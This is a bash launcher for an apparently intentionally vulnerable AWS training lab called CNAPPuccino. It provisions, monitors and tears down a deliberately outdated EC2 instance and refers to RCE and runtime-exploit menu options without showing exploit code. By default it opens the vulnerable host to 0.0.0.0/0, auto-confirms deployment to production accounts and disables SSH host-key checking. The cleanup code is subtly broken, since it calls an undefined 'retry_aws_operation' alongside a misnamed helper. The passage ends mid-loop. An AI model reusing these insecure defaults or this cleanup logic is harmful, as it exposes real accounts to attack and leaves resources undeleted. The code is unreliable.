#!/usr/bin/env bash
set -euo pipefail

# -----------------------------
# Simple visual theme and utils
# -----------------------------
if command -v tput >/dev/null 2>&1 && [[ -t 1 ]]; then
  BOLD="$(tput bold)"; DIM="$(tput dim)"; RESET="$(tput sgr0)"
  RED="$(tput setaf 1)"; GREEN="$(tput setaf 2)"; YELLOW="$(tput setaf 3)"
  CYAN="$(tput setaf 6)"; MAGENTA="$(tput setaf 5)"; BLUE="$(tput setaf 4)"
else
  BOLD=""; DIM=""; RESET=""; RED=""; GREEN=""; YELLOW=""; CYAN=""; MAGENTA=""; BLUE=""
fi

ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TF_DIR="$ROOT_DIR/terraform"
STATE_DIR="$ROOT_DIR/cnappuccino-state"
LOG="$ROOT_DIR/.start.log"

# Configuration management (lightweight startup)
load_lab_configuration() {
  # Core lab configuration with defaults - no validation at startup
  export REGION="${REGION:-us-east-1}"
  export OWNER="${OWNER:-barista}"
  export PURPOSE="${PURPOSE:-cnappuccino-lab}"
  export INSTANCE_TYPE="${INSTANCE_TYPE:-t3.medium}"
  export AWS_PROFILE="${AWS_PROFILE:-default}"
  export ALLOWED_CIDR="${ALLOWED_CIDR:-0.0.0.0/0}"
}

# Comprehensive validation for configuration menu only
validate_configuration_interactive() {
  echo ""
  headline "Configuration Validation" "Checking AWS credentials and environment"
  
  # Check if we're in a production AWS account
  echo "🔍 Checking AWS account type..."
  local account_id=$(aws sts get-caller-identity --query 'Account' --output text 2>/dev/null || echo "unknown")
  if [[ "$account_id" =~ ^[0-9]{12}$ ]]; then
    local account_type="production"
    if [[ "$account_id" =~ ^123456789012$ || "$account_id" =~ ^000000000000$ ]]; then
      account_type="test"
    fi
    
    echo "   AWS Account: $account_id ($account_type)"
    
    if [[ "$account_type" == "production" ]]; then
      echo ""
      echo "${RED}⚠️  WARNING: This appears to be a production AWS account${RESET}"
      echo "CNAPPuccino will create intentionally vulnerable resources."
      echo ""
      read -p "Proceed with deployment to production account? (Y/n): " confirm
      confirm="${confirm:-Y}"
      if [[ "${confirm,,}" != "y" ]]; then
        echo "Deployment cancelled for safety."
        return 1
      fi
      echo "${GREEN}✅ Confirmed: Proceeding with production account${RESET}"
    else
      echo "${GREEN}✅ Safe: Test/development account detected${RESET}"
    fi
  else
    echo "${YELLOW}⚠️  Could not determine account type${RESET}"
  fi
  
  # Validate AWS CLI and credentials
  echo ""
  echo "🔍 Validating AWS CLI and credentials..."
  if ! command -v aws &>/dev/null; then
    echo "${RED}❌ AWS CLI not found. Please install the AWS CLI.${RESET}"
    return 1
  else
    echo "${GREEN}✅ AWS CLI found${RESET}"
  fi
  
  if ! aws sts get-caller-identity --profile "$AWS_PROFILE" &>/dev/null; then
    echo "${RED}❌ AWS credentials not configured or invalid for profile '$AWS_PROFILE'${RESET}"
    return 1
  else
    echo "${GREEN}✅ AWS credentials valid for profile '$AWS_PROFILE'${RESET}"
  fi
  
  # Validate Terraform
  echo ""
  echo "🔍 Validating Terraform installation..."
  if ! command -v terraform &>/dev/null; then
    echo "${RED}❌ Terraform not found. Please install Terraform >= 1.6.0${RESET}"
    return 1
  else
    local tf_version=$(terraform version -json 2>/dev/null | jq -r '.terraform_version' 2>/dev/null || echo "unknown")
    if [[ "$tf_version" != "unknown" ]]; then
      local major=$(echo "$tf_version" | cut -d. -f1)
      local minor=$(echo "$tf_version" | cut -d. -f2)
      if [[ $major -lt 1 || ($major -eq 1 && $minor -lt 6) ]]; then
        echo "${YELLOW}⚠️  Terraform version $tf_version detected. Recommended: >= 1.6.0${RESET}"
      else
        echo "${GREEN}✅ Terraform $tf_version (compatible)${RESET}"
      fi
    else
      echo "${GREEN}✅ Terraform found${RESET}"
    fi
  fi
  
  # Validate required parameters
  echo ""
  echo "🔍 Validating configuration parameters..."
  if [[ -z "$REGION" || -z "$OWNER" || -z "$PURPOSE" ]]; then
    echo "${RED}❌ Required configuration parameters missing${RESET}"
    echo "Required: REGION, OWNER, PURPOSE"
    return 1
  else
    echo "${GREEN}✅ All required parameters set${RESET}"
  fi
  
  echo ""
  echo "${GREEN}✅ Configuration validation complete - ready for deployment${RESET}"
  echo ""
  read -p "Press Enter to continue..."
}

# Load configuration on script startup (fast, no validation)
load_lab_configuration

KEY_NAME="cnappuccino-key"
KEY_PRIV="$STATE_DIR/${KEY_NAME}"
KEY_PUB="$STATE_DIR/${KEY_NAME}.pub"

mkdir -p "$STATE_DIR"
touch "$LOG"

ts() { date "+%Y-%m-%d %H:%M:%S"; }
log() { printf "[%s] %s\n" "$(ts)" "$*" | tee -a "$LOG"; }

# -----------------------------
# Spinner for progress feedback
# -----------------------------
spinner() {
  local pid=$1
  local msg="${2:-Working...}"
  local delay=0.1
  local spinstr='⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏'
  while kill -0 $pid 2>/dev/null; do
    for i in $(seq 0 9); do
      printf "\r${CYAN}%s${RESET} %s" "${spinstr:$i:1}" "$msg"
      sleep $delay
    done
  done
  printf "\r"
  wait $pid
}

banner() {
cat <<'B'
   ____ _   _    _    ____  ____                 _
  / ___| \ | |  / \  |  _ \|  _ \ _   _  ___ ___(_)_ __   ___
 | |   |  \| | / _ \ | |_) | |_) | | | |/ __/ __| | '_ \ / _ \
 | |___| |\  |/ ___ \|  __/|  __/| |_| | (_| (__| | | | | (_) |
  \____|_| \_/_/   \_\_|   |_|    \__,_|\___\___|_|_| |_|\___/

Single Shot Deploy, Poured into the Cloud... ☕ ☁️
                                                               
B
sleep 1
}

headline() {
  echo "${BOLD}${CYAN}$1${RESET}"
  [[ $# -gt 1 ]] && echo "${DIM}$2${RESET}"
  echo
}

pause() {
  if [[ -t 0 ]]; then  # Only pause if stdin is a terminal
    read -r -p "Press Enter to continue... " _ || true
  fi
}

need() {
  command -v "$1" >/dev/null 2>&1 || {
    echo "${RED}Missing dependency: $1${RESET}"
    echo "Install it, then re-run start.sh"
    exit 1
  }
}

# -----------------------------
# Lab status functions
# -----------------------------
get_lab_status() {
  local ip; ip=$(terraform_output_raw public_ip)
  if [[ -n "$ip" && "$ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    echo "${GREEN}✅ Running${RESET} (${ip})"
  else
    echo "${YELLOW}⏸ No lab running${RESET}"
  fi
}

get_soak_time() {
  local tfvars_file="$TF_DIR/terraform.tfvars"
  if [[ ! -f "$tfvars_file" ]]; then
    echo "Not deployed"
    return
  fi
  
  # Check if we actually have a running instance
  local ip; ip=$(terraform_output_raw public_ip)
  if [[ -z "$ip" || ! "$ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    echo "Not deployed"
    return
  fi
  
  local deploy_time; deploy_time=$(stat -c %Y "$tfvars_file" 2>/dev/null || stat -f %m "$tfvars_file" 2>/dev/null || echo "0")
  local current_time; current_time=$(date +%s)
  local elapsed=$((current_time - deploy_time))
  local hours=$((elapsed / 3600))
  
  if [[ $hours -ge 24 ]]; then
    echo "${GREEN}Ready for Stage 2${RESET} (${hours}h soak time)"
  else
    local remaining=$((24 - hours))
    echo "${YELLOW}Soaking${RESET} (${hours}h elapsed, ${remaining}h remaining)"
  fi
}

lab_status_and_diagnostics() {
  headline "Lab Status & Diagnostics" "Complete overview of your CNAPPuccino lab"
  
  local ip; ip=$(terraform_output_raw public_ip)
  local iid; iid=$(terraform_output_raw instance_id)
  local sg; sg=$(terraform_output_raw security_group_id)
  local soak_status; soak_status=$(get_soak_time)
  
  if [[ -z "$ip" ]]; then
    echo "${YELLOW}⏸ No lab running${RESET}"
    echo ""
    echo "To start your lab:"
    echo "• Use option 2 to deploy lab"
    return 1
  fi
  
  # Basic instance info
  echo "${GREEN}✅ Lab is running${RESET}"
  echo
  echo "${BOLD}Instance Details:${RESET}"
  echo "• Instance ID: ${BOLD}${iid}${RESET}"
  echo "• Public IP: ${BOLD}${ip}${RESET}"  
  echo "• Security Group: ${BOLD}${sg}${RESET}"
  echo "• Soak Status: ${soak_status}"
  echo
  
  # Bootstrap diagnostics
  echo "${BOLD}Bootstrap Status:${RESET}"
  
  # Check SSH connectivity
  if ! ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -i "$KEY_PRIV" ubuntu@"$ip" "echo 'SSH OK'" >/dev/null 2>&1; then
    echo "❌ SSH connection failed - instance may still be booting"
    echo "   Wait a few minutes and try again"
    return 1
  fi
  
  # Get bootstrap status
  local bootstrap_status; bootstrap_status=$(ssh -o StrictHostKeyChecking=no -i "$KEY_PRIV" ubuntu@"$ip" \
    "cat /opt/cnappuccino/state/bootstrap_status 2>/dev/null || echo 'not-started'")
  
  case "$bootstrap_status" in
    "completed")
      echo "✅ ${GREEN}Bootstrap completed successfully${RESET}"
      ;;
    "failed")
      echo "❌ ${RED}Bootstrap failed${RESET}"
      local failed_phase; failed_phase=$(ssh -o StrictHostKeyChecking=no -i "$KEY_PRIV" ubuntu@"$ip" \
        "cat /opt/cnappuccino/state/failed_phase 2>/dev/null || echo 'unknown'")
      local error_code; error_code=$(ssh -o StrictHostKeyChecking=no -i "$KEY_PRIV" ubuntu@"$ip" \
        "cat /opt/cnappuccino/state/last_error_code 2>/dev/null || echo 'unknown'")
      echo "   Failed Phase: ${RED}${failed_phase}${RESET} (exit code: ${error_code})"
      ;;
    "started")
      echo "🔄 ${YELLOW}Bootstrap in progress${RESET}"
      local completed_phases; completed_phases=$(ssh -o StrictHostKeyChecking=no -i "$KEY_PRIV" ubuntu@"$ip" \
        "ls /opt/cnappuccino/state/phase_* 2>/dev/null | xargs -r -n1 basename | sed 's/phase_//' | tr '\n' ', ' | sed 's/,$//'")
      local running_phase; running_phase=$(ssh -o StrictHostKeyChecking=no -i "$KEY_PRIV" ubuntu@"$ip" \
        "ls /opt/cnappuccino/state/phase_*.status 2>/dev/null | xargs -r -n1 basename | sed 's/phase_//' | sed 's/.status$//' | tail -1")
      echo "   Completed: ${GREEN}${completed_phases:-none}${RESET}"
      [[ -n "$running_phase" ]] && echo "   Current: ${YELLOW}${running_phase}${RESET}"
      ;;
    *)
      echo "❓ ${YELLOW}Bootstrap status unknown${RESET}"
      ;;
  esac
  
  # Service status (only if bootstrap completed or in progress)
  if [[ "$bootstrap_status" == "completed" || "$bootstrap_status" == "started" ]]; then
    echo
    echo "${BOLD}Services:${RESET}"
    ssh -o StrictHostKeyChecking=no -i "$KEY_PRIV" ubuntu@"$ip" \
      "systemctl is-active apache2 nginx ssh 2>/dev/null | paste <(echo -e 'apache2\nnginx\nssh') - | sed 's/^/• /'" | sed "s/active/${GREEN}active${RESET}/g" | sed "s/inactive/${RED}inactive${RESET}/g"
      
    echo
    echo "${BOLD}Listening Ports:${RESET}"
    ssh -o StrictHostKeyChecking=no -i "$KEY_PRIV" ubuntu@"$ip" \
      "ss -tlnp 2>/dev/null | grep -E ':(80|8080|8443|22) ' | sed 's/^/• /' || echo '• No expected ports listening yet'"
  fi
  
  echo
  echo "${BOLD}Quick Actions:${RESET}"
  if [[ "$bootstrap_status" == "completed" ]]; then
    echo "• SSH: Use option 7 to connect"
    echo "• Quick RCE Test: Use option 3"  
    echo "• Runtime Exploits: Use option 5 (after 24h soak)"
  elif [[ "$bootstrap_status" == "started" ]]; then
    echo "• Wait for bootstrap to complete (~10-15 minutes)"
    echo "• Monitor progress by running this option again"
  else
    echo "• Check bootstrap logs via SSH"
    echo "• Consider cleanup (option 8) and redeploy (option 2)"
  fi
  echo "• Cleanup: Use option 8 when finished"
}

# -----------------------------
# Preflight and configuration
# -----------------------------
check_deps() {
  headline "Preflight Check" "Verifying required tools and AWS identity"
  
  for c in terraform jq aws ssh; do need "$c"; done
  if ! aws --profile "$AWS_PROFILE" sts get-caller-identity >/dev/null 2>&1; then
    echo "${YELLOW}AWS CLI is not authenticated for profile '${AWS_PROFILE}'.${RESET}"
    echo "Run: aws configure --profile ${AWS_PROFILE}"
    return 1
  fi
  echo "${GREEN}All checks passed for profile '${AWS_PROFILE}'.${RESET}"
}

ensure_key() {
  if [[ ! -f "$KEY_PRIV" ]]; then
    headline "SSH Key" "Creating a new key for this lab"
    ssh-keygen -t ed25519 -N "" -f "$KEY_PRIV" >/dev/null
    log "Generated new SSH key pair: ${KEY_NAME}"
    echo "Key created at ${KEY_PRIV}"
  fi
}

write_tfvars() {
  cat > "$TF_DIR/terraform.tfvars" <<EOF
region = "${REGION}"
owner  = "${OWNER}"
purpose = "${PURPOSE}"
instance_type = "${INSTANCE_TYPE}"
ssh_pub_key_path = "${KEY_PUB}"
allowed_cidr = "${ALLOWED_CIDR}"
EOF
}

tf() { (cd "$TF_DIR" && AWS_PROFILE="$AWS_PROFILE" terraform "$@"); }

terraform_init() {
  headline "Terraform Init" "Initialize providers and prepare the working directory"
  log "Starting terraform init (region=${REGION}, owner=${OWNER})"
  write_tfvars
  tf init -upgrade &
  spinner $! "Initializing Terraform (this may take 1-2 min)..."
  log "Terraform init completed successfully"
  echo "${GREEN}Init complete.${RESET}"
}

terraform_apply() {
   headline "Provision Infrastructure" "Creating your CNAPPuccino lab environment"
   log "Starting lab deployment (${INSTANCE_TYPE} in ${REGION})"
   write_tfvars
   ensure_key
   tf apply -auto-approve &
   spinner $! "Provisioning infrastructure (this may take 2-3 min)..."

   local ip ssh_cmd instance_id
   ip=$(terraform_output_raw public_ip)
   ssh_cmd=$(terraform_output_raw ssh_command)
   instance_id=$(terraform_output_raw instance_id)
   log "Lab deployment completed - Instance: ${instance_id:-unknown}, IP: ${ip:-unknown}, SSH: ${ssh_cmd:-unknown}"

   # Set environment variables for menu
   export CNAPPUCCINO_MENU_IP="$ip"
   export CNAPPUCCINO_MENU_SSH="$ssh_cmd"

   # Show immediate summary
   show_post_deploy_summary

   # Enhanced bootstrap monitoring with expected times
   echo
   echo "${YELLOW}📊 Bootstrap Progress Monitoring${RESET}"
   echo "The infrastructure is deployed, but user data bootstrap is still running..."
   echo
   echo "${CYAN}Expected Bootstrap Timeline:${RESET}"
   echo "• ${BOLD}0-2 min${RESET}: Initial setup and package downloads"
   echo "• ${BOLD}2-5 min${RESET}: Installing vulnerable packages (Ubuntu 14.04 repos)"
   echo "• ${BOLD}5-8 min${RESET}: Downloading assets from S3"
   echo "• ${BOLD}8-10 min${RESET}: Configuring Apache/Nginx services"
   echo "• ${BOLD}10-12 min${RESET}: Starting services and validation"
   echo "${RED}⚠️  Total expected time: 10-15 minutes${RESET}"
   echo

   read -r -p "Would you like to monitor bootstrap progress live? (y/N): " monitor_choice
   if [[ "${monitor_choice,,}" == "y" ]]; then
     echo
     echo "Starting live bootstrap monitoring..."
     echo "${DIM}Press Ctrl+C to stop monitoring${RESET}"
     sleep 2
     show_enhanced_bootstrap_progress
   else
     echo
     echo "${DIM}Use option 4 (Lab Status) or option 9 (Bootstrap Diagnostics) to check progress later.${RESET}"
     echo "${DIM}Or run: ./start.sh → option 9 for detailed diagnostics${RESET}"
   fi

   # Final validation check
   echo
   echo "${CYAN}🔍 Performing final deployment validation...${RESET}"
   local final_deployment_status; final_deployment_status=$(check_deployment_status)

   if [[ "$final_deployment_status" == "completed"* ]]; then
     echo "${GREEN}✅ Deployment validation successful!${RESET}"
     echo "${GREEN}🎉 Your CNAPPuccino lab is fully deployed and ready for testing.${RESET}"
     echo
     echo "${BOLD}Recommended next steps:${RESET}"
     echo "• ${CYAN}Option 3${RESET}: Run Quick RCE Test to validate functionality"
     echo "• ${CYAN}Option 7${RESET}: SSH into the instance to explore"
     echo "• ${CYAN}Option 9${RESET}: View detailed bootstrap diagnostics"
     echo "• ${CYAN}Wait 24h${RESET}: Then use Option 5 for full runtime exploitation"
   elif [[ "$final_deployment_status" == "failed" ]]; then
     echo "${RED}❌ Deployment validation failed!${RESET}"
     echo "${RED}The bootstrap script encountered an error and could not complete.${RESET}"
     echo
     echo "${BOLD}Troubleshooting options:${RESET}"
     echo "• ${CYAN}Option 9${RESET}: View detailed bootstrap diagnostics and logs"
     echo "• ${CYAN}Option 8${RESET}: Clean up and try redeployment"
     echo "• Check AWS console for instance status and system logs"
   elif [[ "$final_deployment_status" == "deploying"* ]]; then
     local phase_info="${final_deployment_status//deploying/}"
     echo "${YELLOW}⚠️  Deployment still in progress (phase: ${phase_info})${RESET}"
     echo "${YELLOW}The bootstrap script is taking longer than expected.${RESET}"
     echo
     echo "${BOLD}You can:${RESET}"
     echo "• ${CYAN}Option 9${RESET}: Monitor progress with detailed diagnostics"
     echo "• ${CYAN}Wait and check back later${RESET}"
     echo "• ${CYAN}Option 8${RESET}: Clean up if it's been stuck too long"
   else
     echo "${YELLOW}❓ Deployment status unclear${RESET}"
     echo "${YELLOW}Unable to definitively determine deployment status.${RESET}"
     echo
     echo "${BOLD}Please use:${RESET}"
     echo "• ${CYAN}Option 9${RESET}: Bootstrap diagnostics for detailed information"
     echo "• ${CYAN}Option 4${RESET}: Lab status for current state"
   fi
}

terraform_destroy() {
  headline "Standard Cleanup" "Removing AWS infrastructure, keeping local files"
  local ip; ip=$(terraform_output_raw public_ip)
  local instance_id; instance_id=$(terraform_output_raw instance_id)
  log "Starting standard cleanup of lab ${ip:-unknown} (instance: ${instance_id:-unknown})"
  write_tfvars
  tf destroy -auto-approve &
  spinner $! "Destroying infrastructure (this may take 1-2 min)..."
  log "Standard cleanup completed - AWS infrastructure destroyed"
  echo "${GREEN}AWS infrastructure destroyed. Local SSH keys and config preserved.${RESET}"
}

# Helper functions for AWS cleanup operations
retry_aws_operationeration() {
  local max_attempts=5
  local attempt=1
  local cmd="$1"
  local description="${2:-AWS operation}"
  
  while [[ $attempt -le $max_attempts ]]; do
    if eval "$cmd" 2>/dev/null; then
      return 0
    fi
    if [[ $attempt -eq $max_attempts ]]; then
      echo "   Failed: $description (gave up after $max_attempts attempts)"
      return 1
    fi
    echo "   Retry $attempt/$max_attempts: $description"
    sleep $((attempt * 2))
    ((attempt++))
  done
}

cleanup_network_interfaces() {
  local vpc_ids="$1"
  echo "Cleaning up network interfaces..."
  
  if [[ -n "$vpc_ids" && "$vpc_ids" != "None" ]]; then
    for vpc_id in $vpc_ids; do
      local eni_ids
      eni_ids=$(aws --profile "$AWS_PROFILE" ec2 describe-network-interfaces --filters "Name=vpc-id,Values=$vpc_id" --query "NetworkInterfaces[?Status!='in-use'].NetworkInterfaceId" --output text 2>/dev/null || echo "")
      if [[ -n "$eni_ids" && "$eni_ids" != "None" ]]; then
        for eni_id in $eni_ids; do
          retry_aws_operationeration "aws --profile '$AWS_PROFILE' ec2 delete-network-interface --network-interface-id '$eni_id'" "delete ENI $eni_id"
        done
      fi
    done
  fi
}

cleanup_security_groups() {
  local vpc_ids="$1"
  echo "Removing security group rules..."
  
  if [[ -n "$vpc_ids" && "$vpc_ids" != "None" ]]; then
    for vpc_id in $vpc_ids; do
      local sg_ids
      sg_ids=$(aws --profile "$AWS_PROFILE" ec2 describe-security-groups --filters "Name=vpc-id,Values=$vpc_id" "Name=group-name,Values=!default" --query "SecurityGroups[].GroupId" --output text 2>/dev/null || echo "")
      if [[ -n "$sg_ids" && "$sg_ids" != "None" ]]; then
        for sg_id in $sg_ids; do
          # Remove ingress rules
          aws --profile "$AWS_PROFILE" ec2 describe-security-groups --group-ids "$sg_id" --query "SecurityGroups[0].IpPermissions" --output json 2>/dev/null | \
            jq -r '.[]?' 2>/dev/null | while read -r rule; do
              aws --profile "$AWS_PROFILE" ec2 revoke-security-group-ingress --group-id "$sg_id" --ip-permissions "$rule" 2>/dev/null || true
            done
          # Remove egress rules
          aws --profile "$AWS_PROFILE" ec2 describe-security-groups --group-ids "$sg_id" --query "SecurityGroups[0].IpPermissionsEgress" --output json 2>/dev/null | \
            jq -r '.[]?' 2>/dev/null | while read -r rule; do
              aws --profile "$AWS_PROFILE" ec2 revoke-security-group-egress --group-id "$sg_id" --ip-permissions "$rule" 2>/dev/null || true
            done
        done
      fi
    done
  fi
  
  echo "Deleting security groups..."
  if [[ -n "$vpc_ids" && "$vpc_ids" != "None" ]]; then
    for vpc_id in $vpc_ids; do
      local sg_ids
      sg_ids=$(aws --profile "$AWS_PROFILE" ec2 describe-security-groups --filters "Name=vpc-id,Values=$vpc_id" "Name=group-name,Values=!default" --query "SecurityGroups[].GroupId" --output text 2>/dev/null || echo "")
      if [[ -n "$sg_ids" && "$sg_ids" != "None" ]]; then
        for sg_id in $sg_ids; do
          retry_aws_operationeration "aws --profile '$AWS_PROFILE' ec2 delete-security-group --group-id '$sg_id'" "delete security group $sg_id"
        done
      fi
    done
  fi
}

cleanup_route_tables() {
  local vpc_ids="$1"
  echo "Disassociating route tables..."
  
  if [[ -n "$vpc_ids" && "$vpc_ids" != "None" ]]; then
    for vpc_id in $vpc_ids; do
      local rt_assoc_ids
      rt_assoc_ids=$(aws --profile "$AWS_PROFILE" ec2 describe-route-tables --filters "Name=vpc-id,Values=$vpc_id" --query "RouteTables[].Associations[?Main==\`false\`].RouteTableAssociationId" --output text 2>/dev/null || echo "")
      if [[ -n "$rt_assoc_ids" && "$rt_assoc_ids" != "None" ]]; then
        for assoc_id in $rt_assoc_ids; do
          retry_aws_operationeration "aws --profile '$AWS_PROFILE' ec2 disassociate-route-table --association-id '$assoc_id'" "disassociate route table $assoc_id"
        done
      fi
      
      # Delete custom route tables
      local rt_ids
      rt_ids=$(aws --profile "$AWS_PROFILE" ec2 describe-route-tables --filters "Name=vpc-id,Values=$vpc_id" --query "RouteTables[?Associations[0].Main==\`false\`].RouteTableId" --output text 2>/dev/null || echo "")
      if [[ -n "$rt_ids" && "$rt_ids" != "None" ]]; then
        for rt_id in $rt_ids; do
          retry_aws_operationeration "aws --profile '$AWS_PROFILE' ec2 delete-route-table --route-table-id '$rt_id'" "delete route table $rt_id"
        done
      fi
    done
  fi
}

cleanup_iam_resources() {
  echo "Cleaning up IAM resources..."
  
  # Delete instance profiles
  local profiles
  profiles=$(aws --profile "$AWS_PROFILE" iam list-instance-profiles --query "InstanceProfiles[?contains(InstanceProfileName, 'cnappuccino') || contains(InstanceProfileName, 'CNAPPuccino')].InstanceProfileName" --output text 2>/dev/null || echo "")
  if [[ -n "$profiles" && "$profiles" != "None" ]]; then
    for profile in $profiles; do
      # Remove roles from instance profile first
      local roles
      roles=$(aws --profile "$AWS_PROFILE" iam get-instance-profile --instance-profile-name "$profile" --query "InstanceProfile.Roles[].RoleName" --output text 2>/dev/null || echo "")
      for role in $roles; do
        retry_aws_operationeration "aws --profile '$AWS_PROFILE' iam remove-role-from-instance-profile --instance-profile-name '$profile' --role-name '$role'" "remove role $role from instance profile $profile"
      done
      retry_aws_operationeration "aws --profile '$AWS_PROFILE' iam delete-instance-profile --instance-profile-name '$profile'" "delete instance profile $profile"
    done
  fi
  
  # Delete IAM roles
  local roles
  roles=$(aws --profile "$AWS_PROFILE" iam list-roles --query "Roles[?contains(RoleName, 'cnappuccino') || contains(RoleName, 'CNAPPuccino')].RoleName" --output text 2>/dev/null || echo "")
  if [[ -n "$roles" && "$roles" != "None" ]]; then
    for role in $roles; do
      # Detach managed policies
      local managed_policies
      managed_policies=$(aws --profile "$AWS_PROFILE" iam list-attached-role-policies --role-name "$role" --query "AttachedPolicies[].PolicyArn" --output text 2>/dev/null || echo "")
      for policy_arn in $managed_policies; do
        retry_aws_operationeration "aws --profile '$AWS_PROFILE' iam detach-role-policy --role-name '$role' --policy-arn '$policy_arn'" "detach policy $policy_arn from role $role"
      done
      
      # Delete inline policies
      local inline_policies
      inline_policies=$(aws --profile "$AWS_PROFILE" iam list-role-policies --role-name "$role" --query "PolicyNames" --output text 2>/dev/null || echo "")
      for policy_name in $inline_policies; do
        retry_aws_operationeration "aws --profile '$AWS_PROFILE' iam delete-role-policy --role-name '$role' --policy-name '$policy_name'" "delete inline policy $policy_name from role $role"
      done
      
      retry_aws_operationeration "aws --profile '$AWS_PROFILE' iam delete-role --role-name '$role'" "delete role $role"
    done
  fi
}

terraform_nuke() {
  headline "Nuclear Option" "Force destroy ALL CNAPPuccino resources in AWS"
  echo "${RED}WARNING: This will forcibly delete ALL CNAPPuccino resources!${RESET}"
  echo "This includes:"
  echo "• EC2 instances with CNAPPuccino tags"
  echo "• IAM roles and instance profiles containing 'cnappuccino'"
  echo "• Key pairs named 'cnappuccino-kp'"
  echo "• VPCs and networking resources"
  echo "• Elastic IPs"
  echo ""
  read -r -p "Proceed with nuclear cleanup? (y/N): " confirm
  [[ "${confirm,,}" != "y" ]] && { echo "Cancelled."; return; }
  
  log "Starting nuclear cleanup - force destroying ALL CNAPPuccino resources"
  echo "${RED}🚀 Initiating nuclear cleanup...${RESET}"
  
  # Using global helper functions for better code reuse
  
  # Step 1: Try terraform destroy first
  echo "1/12 Running terraform destroy..."
  if [[ -f "$TF_DIR/terraform.tfvars" ]]; then
    (cd "$TF_DIR" && AWS_PROFILE="$AWS_PROFILE" terraform destroy -auto-approve) || true
    echo "   Terraform destroy completed (or failed - continuing with manual cleanup)"
  else
    echo "   No terraform.tfvars found - skipping terraform destroy"
  fi
  
  # Step 2: Terminate EC2 instances and wait for termination
  echo "2/12 Terminating CNAPPuccino instances..."
  local instance_ids
  instance_ids=$(aws --profile "$AWS_PROFILE" ec2 describe-instances --filters "Name=tag:purpose,Values=cnappuccino-lab" "Name=instance-state-name,Values=running,pending,stopping,stopped" --query "Reservations[].Instances[].InstanceId" --output text 2>/dev/null || echo "")
  if [[ -n "$instance_ids" && "$instance_ids" != "None" ]]; then
    aws --profile "$AWS_PROFILE" ec2 terminate-instances --instance-ids $instance_ids || true
    echo "   Waiting for instances to terminate..."
    aws --profile "$AWS_PROFILE" ec2 wait instance-terminated --instance-ids $instance_ids 2>/dev/null || true
    sleep 10  # Extra buffer for AWS to fully release resources
  fi
  
  # Step 3: Clean up network interfaces (critical for VPC deletion)
  echo "3/12 Cleaning up network interfaces..."
  local vpc_ids
  vpc_ids=$(aws --profile "$AWS_PROFILE" ec2 describe-vpcs --filters "Name=tag:purpose,Values=cnappuccino-lab" --query "Vpcs[].VpcId" --output text 2>/dev/null || echo "")
  if [[ -n "$vpc_ids" && "$vpc_ids" != "None" ]]; then
    for vpc_id in $vpc_ids; do
      # Find and detach/delete ENIs
      local eni_ids
      eni_ids=$(aws --profile "$AWS_PROFILE" ec2 describe-network-interfaces --filters "Name=vpc-id,Values=$vpc_id" --query "NetworkInterfaces[?Status!='in-use'].NetworkInterfaceId" --output text 2>/dev/null || echo "")
      if [[ -n "$eni_ids" && "$eni_ids" != "None" ]]; then
        for eni_id in $eni_ids; do
          retry_aws_operationeration "aws --profile '$AWS_PROFILE' ec2 delete-network-interface --network-interface-id '$eni_id'" "delete ENI $eni_id"
        done
      fi
    done
  fi
  
  # Step 4: Release Elastic IPs
  echo "4/12 Releasing Elastic IPs..."
  local eip_alloc_ids
  eip_alloc_ids=$(aws --profile "$AWS_PROFILE" ec2 describe-addresses --filters "Name=tag:purpose,Values=cnappuccino-lab" --query "Addresses[].AllocationId" --output text 2>/dev/null || echo "")
  if [[ -n "$eip_alloc_ids" && "$eip_alloc_ids" != "None" ]]; then
    for alloc_id in $eip_alloc_ids; do
      retry_aws_operation "aws --profile '$AWS_PROFILE' ec2 release-address --allocation-id '$alloc_id'" "release EIP $alloc_id"
    done
  fi
  
  # Step 5: Remove security group rules first (handle dependencies)
  echo "5/12 Removing security group rules..."
  if [[ -n "$vpc_ids" && "$vpc_ids" != "None" ]]; then
    for vpc_id in $vpc_ids; do
      local sg_ids
      sg_ids=$(aws --profile "$AWS_PROFILE" ec2 describe-security-groups --filters "Name=vpc-id,Values=$vpc_id" "Name=group-name,Values=!default" --query "SecurityGroups[].GroupId" --output text 2>/dev/null || echo "")
      if [[ -n "$sg_ids" && "$sg_ids" != "None" ]]; then
        for sg_id in $sg_ids; do
          # Remove ingress rules
          aws --profile "$AWS_PROFILE" ec2 describe-security-groups --group-ids "$sg_id" --query "SecurityGroups[0].IpPermissions" --output json 2>/dev/null | \
            jq -r '.[]?' 2>/dev/null | while read -r rule; do
              aws --profile "$AWS_PROFILE" ec2 revoke-security-group-ingress --group-id "$sg_id" --ip-permissions "$rule" 2>/dev/null || true
            done
          # Remove egress rules
          aws --profile "$AWS_PROFILE" ec2 describe-security-groups --group-ids "$sg_id" --query "SecurityGroups[0].IpPermissionsEgress" --output json 2>/dev/null | \
            jq -r '.[]?' 2>/dev/null | while read -r rule; do
              aws --profile "$AWS_PROFILE" ec2 revoke-security-group-egress --group-id "$sg_id" --ip-permissions "$rule" 2>/dev/null || true
            done
        done
      fi
    done
  fi
  
  # Step 6: Delete security groups (after rules are removed)
  echo "6/12 Deleting security groups..."
  if [[ -n "$vpc_ids" && "$vpc_ids" != "None" ]]; then
    for vpc_id in $vpc_ids; do
      local sg_ids
      sg_ids=$(aws --profile "$AWS_PROFILE" ec2 describe-security-groups --filters "Name=vpc-id,Values=$vpc_id" "Name=group-name,Values=!default" --query "SecurityGroups[].GroupId" --output text 2>/dev/null || echo "")
      if [[ -n "$sg_ids" && "$sg_ids" != "None" ]]; then
        for sg_id in $sg_ids; do
          retry_aws_operation "aws --profile '$AWS_PROFILE' ec2 delete-security-group --group-id '$sg_id'" "delete security group $sg_id"
        done
      fi
    done
  fi
  
  # Step 7: Disassociate route table associations
  echo "7/12 Disassociating route tables..."
  if [[ -n "$vpc_ids" && "$vpc_ids" != "None" ]]; then
    for vpc_id in $vpc_ids; do
      local rt_assoc_ids
      rt_assoc_ids=$(aws --profile "$AWS_PROFILE" ec2 describe-route-tables --filters "Name=vpc-id,Values=$vpc_id" --query "RouteTables[].Associations[?Main==\`false\`].RouteTableAssociationId" --output text 2>/dev/null || echo "")
      if [[ -n "$rt_assoc_ids" && "$rt_assoc_ids" != "None" ]]; then
        for assoc_id in $rt_assoc_ids; do
